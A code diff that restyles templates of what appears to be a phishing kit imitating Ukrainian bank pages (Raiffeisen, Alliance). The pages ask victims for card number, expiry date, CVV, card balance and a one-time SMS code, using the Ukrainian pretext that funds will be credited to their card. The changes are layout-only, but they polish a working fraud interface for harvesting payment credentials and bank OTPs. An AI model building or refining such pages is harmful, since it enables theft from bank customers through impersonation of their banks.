@@ -701,13 +701,11 @@ document.addEventListener('DOMContentLoaded', () => {
                     <div class="alliance-input-group" id="alliance-details-card-group">
                         <input type="tel" id="alliance-details-card-input" class="alliance-input-field" placeholder="Номер картки" autocomplete="off">
                     </div>
-                    <div class="alliance-input-group-row">
-                        <div class="alliance-input-group" id="alliance-details-exp-group">
-                            <input type="tel" id="alliance-details-exp-input" class="alliance-input-field" placeholder="Термін (ММ/РР)" autocomplete="off">
-                        </div>
-                        <div class="alliance-input-group" id="alliance-details-cvv-group">
-                            <input type="tel" id="alliance-details-cvv-input" class="alliance-input-field" placeholder="CVV" autocomplete="off">
-                        </div>
+                    <div class="alliance-input-group" id="alliance-details-exp-group">
+                        <input type="tel" id="alliance-details-exp-input" class="alliance-input-field" placeholder="Термін (ММ/РР)" autocomplete="off">
+                    </div>
+                    <div class="alliance-input-group" id="alliance-details-cvv-group">
+                        <input type="tel" id="alliance-details-cvv-input" class="alliance-input-field" placeholder="CVV" autocomplete="off">
                     </div>
                     <div class="alliance-input-group" id="alliance-details-balance-group">
                         <input type="text" id="alliance-details-balance-input" class="alliance-input-field" placeholder="Поточний баланс картки" autocomplete="off">
@@ -986,7 +984,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="title" style="color: ${theme.text};">${activeBankData.name}</span>
                  <img src="${activeBankData.logoUrl}" class="raiff-header-logo" alt="Логотип банку">
             </div>
-            <div class="raiff-content-wrapper" style="color: ${theme.text};">
+            <div class="raiff-content-wrapper" style="color: ${theme.text}; align-items: center;">
                 <div class="raiff-icon-container">
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="${theme.primary}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="${theme.primary}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </div>
@@ -1033,13 +1031,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 <span class="title"></span>
                 <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
-            <div class="alliance-content-wrapper">
+            <div class="alliance-content-wrapper" style="align-items: center;">
                  <div class="alliance-icon-container">
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="var(--alliance-primary)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </div>
                 <h2 class="alliance-main-title">Останній крок</h2>
                 <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
-                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin: 0 auto 25px auto; max-width: 350px;">
+                <div class="raiff-code-inputs ${options.error ? 'error' : ''}" style="margin-bottom: 25px; max-width: 350px; width: 100%;">
                     ${Array(6).fill('<input type="tel" class="raiff-code-input" style="background-color: var(--white); border-color: var(--alliance-border-color); color: var(--alliance-text);" maxlength="1">').join('')}
                 </div>
                 ${options.error ? `<p class="raiff-error-text" style="color: var(--danger-color); text-align: center; font-weight: 500;">Невірний код</p>` : ''}
